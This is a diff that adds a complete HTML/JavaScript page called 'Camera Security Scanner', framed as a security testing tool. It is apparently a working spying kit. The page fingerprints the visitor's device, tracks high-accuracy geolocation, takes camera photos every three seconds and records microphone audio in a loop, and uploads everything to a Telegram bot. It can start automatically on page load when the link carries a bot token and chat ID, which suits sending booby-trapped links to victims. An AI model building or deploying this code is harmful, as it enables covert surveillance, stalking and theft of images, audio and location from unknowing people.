@@ -1,0 +1,750 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>Camera Security Scanner</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+            position: relative;
+        }
+
+        .card {
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            border-radius: 24px;
+            padding: 30px 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 0 40px rgba(0, 100, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            transform: translateY(0);
+            transition: all 0.3s ease;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .logo-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #0066ff, #00ccff);
+            border-radius: 18px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            animation: pulse 2s infinite;
+            box-shadow: 0 10px 30px rgba(0, 102, 255, 0.3);
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        h1 {
+            color: #fff;
+            font-size: 1.8em;
+            margin: 15px 0 5px;
+            text-align: center;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: #8892b0;
+            text-align: center;
+            font-size: 0.9em;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            color: #ccd6f6;
+            margin-bottom: 8px;
+            font-size: 0.85em;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 14px;
+            color: #fff;
+            font-size: 1em;
+            transition: all 0.3s ease;
+            outline: none;
+            font-family: inherit;
+        }
+
+        .input-group input:focus {
+            border-color: #0066ff;
+            box-shadow: 0 0 20px rgba(0, 102, 255, 0.2);
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            font-size: 1.1em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #0066ff, #00ccff);
+            color: #fff;
+            box-shadow: 0 10px 30px rgba(0, 102, 255, 0.3);
+            margin-top: 10px;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(0, 102, 255, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #ff3333, #ff6666);
+            color: #fff;
+            box-shadow: 0 10px 30px rgba(255, 51, 51, 0.3);
+            margin-top: 10px;
+            display: none;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .status.success {
+            background: rgba(0, 255, 100, 0.1);
+            border: 1px solid rgba(0, 255, 100, 0.3);
+            color: #00ff64;
+        }
+
+        .status.error {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            color: #ff3333;
+        }
+
+        .status.info {
+            background: rgba(0, 102, 255, 0.1);
+            border: 1px solid rgba(0, 102, 255, 0.3);
+            color: #0066ff;
+        }
+
+        .spinner {
+            display: none;
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #0066ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 15px auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .camera-preview {
+            width: 100%;
+            border-radius: 14px;
+            margin-top: 15px;
+            display: none;
+            border: 2px solid rgba(0, 102, 255, 0.3);
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.75em;
+            font-weight: 600;
+            margin: 3px;
+        }
+
+        .badge-success {
+            background: rgba(0, 255, 100, 0.15);
+            color: #00ff64;
+        }
+
+        .badge-info {
+            background: rgba(0, 102, 255, 0.15);
+            color: #0066ff;
+        }
+
+        .feature-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 15px;
+            justify-content: center;
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 10px; }
+            .card { padding: 20px 15px; border-radius: 20px; }
+            h1 { font-size: 1.5em; }
+            .btn { padding: 14px; font-size: 1em; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <div class="logo-icon">📷</div>
+            </div>
+            <h1>Camera Scanner</h1>
+            <p class="subtitle">Advanced Security Testing Tool</p>
+
+            <div class="input-group">
+                <label>🤖 Bot Token</label>
+                <input type="text" id="botToken" placeholder="Enter Telegram Bot Token" autocomplete="off">
+            </div>
+
+            <div class="input-group">
+                <label>💬 Chat ID</label>
+                <input type="text" id="chatId" placeholder="Enter Telegram Chat ID" autocomplete="off">
+            </div>
+
+            <button class="btn btn-primary" id="startBtn" onclick="startCapture()">
+                🚀 Start Capture
+            </button>
+            
+            <button class="btn btn-danger" id="stopBtn" onclick="stopCapture()">
+                ⏹️ Stop Capture
+            </button>
+
+            <div class="spinner" id="spinner"></div>
+            
+            <video id="cameraPreview" class="camera-preview" autoplay playsinline muted></video>
+            
+            <div class="status" id="status"></div>
+
+            <div class="feature-list">
+                <span class="badge badge-success">Auto Capture</span>
+                <span class="badge badge-info">Voice Record</span>
+                <span class="badge badge-success">Location</span>
+                <span class="badge badge-info">Fast Upload</span>
+                <span class="badge badge-success">All Devices</span>
+                <span class="badge badge-info">Secure</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let captureInterval = null;
+        let isCapturing = false;
+        let telegramBotToken = '';
+        let telegramChatId = '';
+        let deviceInfo = {};
+
+        // Get device information
+        function getDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'unknown',
+                battery: 'unknown',
+                touchPoints: navigator.maxTouchPoints,
+                vendor: navigator.vendor,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                online: navigator.onLine
+            };
+
+            // Get battery info
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    info.battery = {
+                        level: battery.level * 100,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                });
+            }
+
+            return info;
+        }
+
+        // Get location
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                altitude: position.coords.altitude,
+                                speed: position.coords.speed,
+                                timestamp: new Date(position.timestamp).toISOString()
+                            });
+                        },
+                        (error) => {
+                            resolve({ error: error.message, code: error.code });
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    resolve({ error: 'Geolocation not supported' });
+                }
+            });
+        }
+
+        // Send message to Telegram
+        async function sendToTelegram(type, data, caption = '') {
+            const baseUrl = `https://api.telegram.org/bot${telegramBotToken}`;
+            
+            try {
+                if (type === 'photo') {
+                    const formData = new FormData();
+                    formData.append('chat_id', telegramChatId);
+                    formData.append('photo', data, 'capture.jpg');
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'HTML');
+                    
+                    await fetch(`${baseUrl}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else if (type === 'audio') {
+                    const formData = new FormData();
+                    formData.append('chat_id', telegramChatId);
+                    formData.append('audio', data, 'recording.ogg');
+                    formData.append('caption', caption);
+                    
+                    await fetch(`${baseUrl}/sendAudio`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else if (type === 'message') {
+                    await fetch(`${baseUrl}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: telegramChatId,
+                            text: data,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } else if (type === 'document') {
+                    const formData = new FormData();
+                    formData.append('chat_id', telegramChatId);
+                    formData.append('document', data, 'device_info.json');
+                    formData.append('caption', caption);
+                    
+                    await fetch(`${baseUrl}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+            } catch (error) {
+                console.error('Telegram send error:', error);
+            }
+        }
+
+        // Pin message in Telegram
+        async function pinMessage(messageId) {
+            const baseUrl = `https://api.telegram.org/bot${telegramBotToken}`;
+            try {
+                await fetch(`${baseUrl}/pinChatMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        message_id: messageId,
+                        disable_notification: false
+                    })
+                });
+            } catch (error) {
+                console.error('Pin message error:', error);
+            }
+        }
+
+        // Start camera capture
+        async function startCamera() {
+            const constraints = {
+                video: {
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 },
+                    facingMode: 'environment',
+                    frameRate: { ideal: 60 }
+                },
+                audio: false
+            };
+
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('cameraPreview');
+                video.srcObject = mediaStream;
+                video.style.display = 'block';
+                return true;
+            } catch (error) {
+                // Try fallback constraints
+                try {
+                    const fallbackConstraints = {
+                        video: true,
+                        audio: false
+                    };
+                    mediaStream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
+                    const video = document.getElementById('cameraPreview');
+                    video.srcObject = mediaStream;
+                    video.style.display = 'block';
+                    return true;
+                } catch (fallbackError) {
+                    throw fallbackError;
+                }
+            }
+        }
+
+        // Capture photo from video stream
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                const video = document.getElementById('cameraPreview');
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1920;
+                canvas.height = video.videoHeight || 1080;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob((blob) => {
+                    resolve(blob);
+                }, 'image/jpeg', 0.95);
+            });
+        }
+
+        // Start audio recording
+        async function startAudioRecording() {
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        sampleRate: 44100
+                    } 
+                });
+                
+                audioChunks = [];
+                mediaRecorder = new MediaRecorder(audioStream, {
+                    mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
+                        ? 'audio/webm;codecs=opus' 
+                        : 'audio/webm'
+                });
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        audioChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.start(100); // Collect data every 100ms
+                
+                return audioStream;
+            } catch (error) {
+                console.error('Audio recording error:', error);
+                return null;
+            }
+        }
+
+        // Stop audio recording and get blob
+        function stopAudioRecording() {
+            return new Promise((resolve) => {
+                if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        resolve(audioBlob);
+                    };
+                    mediaRecorder.stop();
+                    
+                    // Stop all audio tracks
+                    mediaRecorder.stream.getTracks().forEach(track => track.stop());
+                } else {
+                    resolve(null);
+                }
+            });
+        }
+
+        // Main capture function
+        async function startCapture() {
+            telegramBotToken = document.getElementById('botToken').value.trim();
+            telegramChatId = document.getElementById('chatId').value.trim();
+
+            if (!telegramBotToken || !telegramChatId) {
+                showStatus('Please enter Bot Token and Chat ID', 'error');
+                return;
+            }
+
+            showStatus('Initializing...', 'info');
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+
+            try {
+                // Get device info
+                deviceInfo = getDeviceInfo();
+                
+                // Get location
+                const location = await getLocation();
+                deviceInfo.location = location;
+
+                // Start camera
+                await startCamera();
+                
+                // Send initial subscription message
+                const subMessage = await sendToTelegram('message', 
+                    '<b>🔔 Subscribe @devzeron</b>\n\n' +
+                    '<i>Advanced Camera Security Testing</i>\n' +
+                    '━━━━━━━━━━━━━━━━━━━━━'
+                );
+
+                // Send device info
+                const deviceInfoBlob = new Blob(
+                    [JSON.stringify(deviceInfo, null, 2)], 
+                    { type: 'application/json' }
+                );
+                const deviceInfoFile = new File([deviceInfoBlob], 'device_info.json', 
+                    { type: 'application/json' });
+                
+                await sendToTelegram('document', deviceInfoFile, 
+                    '<b>📱 Device Information</b>\n' +
+                    `🌐 IP: Fetching...\n` +
+                    `📍 Location: ${location.latitude || 'N/A'}, ${location.longitude || 'N/A'}\n` +
+                    `📱 Device: ${deviceInfo.platform}\n` +
+                    `🖥️ Screen: ${deviceInfo.screenResolution}`
+                );
+
+                isCapturing = true;
+                showStatus('✅ Capture Started!', 'success');
+
+                // Start periodic photo capture
+                let photoCount = 0;
+                captureInterval = setInterval(async () => {
+                    if (!isCapturing) return;
+                    
+                    try {
+                        const photoBlob = await capturePhoto();
+                        const photoFile = new File([photoBlob], `capture_${Date.now()}.jpg`, 
+                            { type: 'image/jpeg' });
+                        
+                        photoCount++;
+                        await sendToTelegram('photo', photoFile,
+                            `<b>📸 Photo Capture #${photoCount}</b>\n` +
+                            `🕐 Time: ${new Date().toLocaleString()}\n` +
+                            `📍 Location: ${deviceInfo.location?.latitude || 'N/A'}, ${deviceInfo.location?.longitude || 'N/A'}`
+                        );
+
+                        document.getElementById('spinner').style.display = 'none';
+                    } catch (error) {
+                        console.error('Photo capture error:', error);
+                    }
+                }, 3000); // Capture every 3 seconds
+
+                // Start audio recording cycle
+                let audioStream = null;
+                const audioCycle = async () => {
+                    if (!isCapturing) return;
+                    
+                    audioStream = await startAudioRecording();
+                    
+                    // Record for 5 seconds
+                    setTimeout(async () => {
+                        if (!isCapturing) return;
+                        
+                        const audioBlob = await stopAudioRecording();
+                        if (audioBlob) {
+                            const audioFile = new File([audioBlob], `recording_${Date.now()}.ogg`, 
+                                { type: 'audio/webm' });
+                            
+                            await sendToTelegram('audio', audioFile,
+                                `<b>🎙️ Voice Recording</b>\n` +
+                                `🕐 Time: ${new Date().toLocaleString()}\n` +
+                                `📏 Duration: 5 seconds`
+                            );
+                        }
+                        
+                        // Continue audio cycle
+                        if (isCapturing) {
+                            setTimeout(audioCycle, 2000);
+                        }
+                    }, 5000);
+                };
+
+                // Start first audio recording
+                audioCycle();
+
+                // Send location update every 30 seconds
+                setInterval(async () => {
+                    if (!isCapturing) return;
+                    
+                    const newLocation = await getLocation();
+                    await sendToTelegram('message',
+                        `<b>📍 Location Update</b>\n` +
+                        `🌍 Lat: ${newLocation.latitude}\n` +
+                        `🌍 Long: ${newLocation.longitude}\n` +
+                        `🎯 Accuracy: ${newLocation.accuracy}m\n` +
+                        `🕐 Time: ${new Date().toLocaleString()}`
+                    );
+                }, 30000);
+
+            } catch (error) {
+                console.error('Start capture error:', error);
+                showStatus('❌ Error: ' + error.message, 'error');
+                document.getElementById('startBtn').style.display = 'block';
+                document.getElementById('stopBtn').style.display = 'none';
+                document.getElementById('spinner').style.display = 'none';
+            }
+        }
+
+        // Stop capture
+        function stopCapture() {
+            isCapturing = false;
+            
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+                mediaRecorder.stream.getTracks().forEach(track => track.stop());
+            }
+
+            const video = document.getElementById('cameraPreview');
+            video.srcObject = null;
+            video.style.display = 'none';
+
+            document.getElementById('startBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+            document.getElementById('spinner').style.display = 'none';
+            
+            showStatus('Capture Stopped', 'info');
+            
+            sendToTelegram('message',
+                '<b>⏹️ Capture Session Ended</b>\n' +
+                `🕐 Time: ${new Date().toLocaleString()}\n` +
+                '━━━━━━━━━━━━━━━━━━━━━'
+            );
+        }
+
+        // Show status message
+        function showStatus(message, type) {
+            const status = document.getElementById('status');
+            status.textContent = message;
+            status.className = 'status ' + type;
+            status.style.display = 'block';
+            
+            if (type === 'success' || type === 'info') {
+                setTimeout(() => {
+                    status.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        // Auto-start if URL parameters present
+        window.addEventListener('load', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const token = urlParams.get('token');
+            const chatId = urlParams.get('chatid');
+            
+            if (token && chatId) {
+                document.getElementById('botToken').value = token;
+                document.getElementById('chatId').value = chatId;
+                startCapture();
+            }
+        });
+
+        // Handle page unload
+        window.addEventListener('beforeunload', () => {
+            if (isCapturing) {
+                stopCapture();
+            }
+        });
+    </script>
+</body>
+</html>
